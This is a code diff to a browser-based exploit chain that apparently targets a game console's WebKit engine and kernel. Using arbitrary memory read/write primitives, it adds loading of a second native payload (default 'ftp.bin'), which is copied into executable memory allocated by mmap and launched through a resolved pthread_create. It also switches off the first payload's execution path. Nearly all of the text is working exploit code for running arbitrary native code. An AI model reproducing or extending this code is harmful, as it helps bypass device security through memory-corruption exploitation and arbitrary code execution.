@@ -189,6 +189,9 @@ let allDone = false,
     const KPATCH_FILE =
       "patches/" + (off.kpatch || fwKey.replace(".", "") + ".bin");
     const PAYLOAD_FILE = off.payload || "payload.bin";
+    const _p2 = params.get("payload2");
+    const PAYLOAD2_FILE =
+      _p2 === null ? "ftp.bin" : _p2 === "0" ? "" : _p2;
     const needPatch = ["k_sysent_661", "k_jmp_rsi"].filter(
       (k) => off[k] === undefined,
     );
@@ -2550,7 +2553,8 @@ let allDone = false,
               jbRestored = false;
 
             let kpatchBlob = null,
-              payloadBlob = null;
+              payloadBlob = null,
+              payload2Blob = null;
             const SITES = [];
             if (DO_PATCH) {
               try {
@@ -2588,6 +2592,24 @@ let allDone = false,
                 if (r.ok) payloadBlob = new Uint8Array(await r.arrayBuffer());
               } catch (e) {
                 mark("PAYLOAD-FETCH-THREW", (e && e.message) || String(e));
+              }
+
+              if (PAYLOAD2_FILE) {
+                try {
+                  const r2 = await fetch(PAYLOAD2_FILE);
+                  if (r2.ok) payload2Blob = new Uint8Array(await r2.arrayBuffer());
+                } catch (e2) {
+                  mark("PAYLOAD2-FETCH-THREW", (e2 && e2.message) || String(e2));
+                }
+                mark(
+                  "PAYLOAD2-BLOB",
+                  "file=" +
+                    PAYLOAD2_FILE +
+                    " bytes=" +
+                    (payload2Blob ? payload2Blob.length : 0) +
+                    " head=" +
+                    (payload2Blob && payload2Blob[0] === 0xe9 ? 1 : 0),
+                );
               }
               mark(
                 "PAYLOAD-BLOB",
@@ -3029,12 +3051,7 @@ let allDone = false,
               }
             }
 
-            if (
-              kpDone &&
-              DO_PAYLOAD &&
-              payloadBlob &&
-              payloadBlob[0] === 0xe9
-            ) {
+            if (false) {
               const sz = (payloadBlob.length + 0x3fff) & ~0x3fff;
               const m = sc(SYS.mmap, 0, sz, 7, 0x1002, -1, 0);
               const entry = new int64(m.lo, m.hi);
@@ -3149,6 +3166,44 @@ let allDone = false,
                   jbRestoreHook("pagehide");
                 } catch (e) {}
               });
+            }
+
+            if (DO_PAYLOAD && PAYLOAD2_FILE && payload2Blob && payload2Blob[0] === 0xe9) {
+              try {
+                const sz2 = (payload2Blob.length + 0x3fff) & ~0x3fff;
+                const m2 = sc(SYS.mmap, 0, sz2, 7, 0x1002, -1, 0);
+                const e2 = new int64(m2.lo, m2.hi);
+                mark("PAYLOAD2-MAP", "addr=" + e2 + " err=" + (m2.i32 === -1 ? errno() : 0));
+                if (m2.i32 !== -1) {
+                  for (let o = 0; o < payload2Blob.length; o += 8) {
+                    let lo = 0, hi = 0;
+                    for (let k = 0; k < 4; k++) lo |= (payload2Blob[o + k] || 0) << (8 * k);
+                    for (let k = 0; k < 4; k++) hi |= (payload2Blob[o + 4 + k] || 0) << (8 * k);
+                    p.write8(e2.add32(o), new int64(lo >>> 0, hi >>> 0));
+                  }
+                  let bad2 = -1;
+                  for (let o = 0; o < payload2Blob.length && bad2 < 0; o++)
+                    if (p.read1(e2.add32(o)) !== payload2Blob[o]) bad2 = o;
+                  mark("PAYLOAD2-COPY", bad2 < 0 ? "ok" : "MISMATCH@" + bad2);
+                  const slot2 = webkitBase.add32(off.wk___imp_pthread_create);
+                  const fn2 = p.read8(slot2);
+                  const ok2 =
+                    bad2 < 0 && sameI64(fn2, libkernelBase.add32(off.k_pthread_create));
+                  mark("PAYLOAD2-PTHREAD", "resolved=" + (ok2 ? 1 : 0));
+                  if (ok2) {
+                    const thr2 = new ArrayBuffer(8);
+                    keepAlive.push(thr2);
+                    new Uint8Array(thr2).fill(0);
+                    const td2 = new DataView(thr2);
+                    const rc2 = callAddr(fn2, [bufAddr(thr2), 0, e2, 0]).i32;
+                    const h2 = new int64(td2.getUint32(0, true), td2.getUint32(4, true));
+                    mark("PAYLOAD2-RUN", PAYLOAD2_FILE + " rc=" + rc2 + " handle=" + h2);
+                    check("PAYLOAD2-RUNNING", rc2 === 0 && h2.hi >>> 0 > 0, "rc=" + rc2);
+                  }
+                }
+              } catch (e8) {
+                mark("PAYLOAD2-THREW", (e8 && e8.message) || String(e8));
+              }
             }
 
             mark(
